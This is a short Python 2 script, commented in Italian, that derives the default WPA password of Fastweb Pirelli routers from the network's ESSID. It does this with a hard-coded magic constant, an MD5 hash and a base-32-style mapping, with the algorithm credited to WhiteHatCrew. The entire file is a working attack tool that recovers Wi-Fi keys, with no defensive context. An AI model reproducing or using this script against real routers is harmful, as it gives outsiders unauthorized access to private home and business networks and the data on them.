"""
Calcola WPA a partire dall'essid dei routers Fastweb Pirelli

Algoritmo by WhiteHatCrew
"""

import hashlib
from sys import argv

ssid = argv[1]

magic =  ("\x22\x33\x11\x34\x02\x81\xFA\x22\x11\x41"
          "\x68\x11\x12\x01\x05\x22\x71\x42\x10\x66")
print len(magic)
# converts ssid from "00112233445566" to "\x00\x11\x22\x33\x44\x55\x66"
h = ""
for x in range(0, len(ssid) - len(ssid) % 2, 2):
    h += chr(int(ssid[x:x+2], 16))

# adds magic
h += magic
# calculate md5
hash = hashlib.md5()
hash.update("".join(h))
m = hash.hexdigest()
# convert to binary and converts to base 32 (5 bits)
b = []
for x in range(0, len(m) - len(m) % 2, 2):
    b.append(str(bin(int(m[x:x+2], 16)))[2:].zfill(8))
b = "".join(b[:5])
b = [b[x:x+5] for x in range(0, len(b) - len(b) % 5, 5)]
print b
# calculate result with the first 5 bytes
r = ""
for e in b[:5]:
    a = int(e, 2)
    if a >= 0xA:
        a += 0x57
    r += "%02x" % a
print r
